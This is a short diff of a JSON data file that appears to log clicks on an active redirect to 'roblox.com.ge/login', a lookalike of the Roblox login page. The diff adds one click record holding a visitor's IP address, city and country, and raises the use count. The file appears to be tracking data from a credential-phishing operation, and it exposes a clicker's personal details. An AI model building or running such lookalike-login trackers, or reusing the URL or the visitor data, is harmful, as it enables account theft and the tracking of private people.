@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 854,
+    "useCount": 855,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6939,6 +6939,14 @@
       },
       {
         "timestamp": 1777182906188,
+        "ip": "175.158.242.225",
+        "country": "Philippines",
+        "city": "Mandaue City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777183318232,
         "ip": "175.158.242.225",
         "country": "Philippines",
         "city": "Mandaue City",
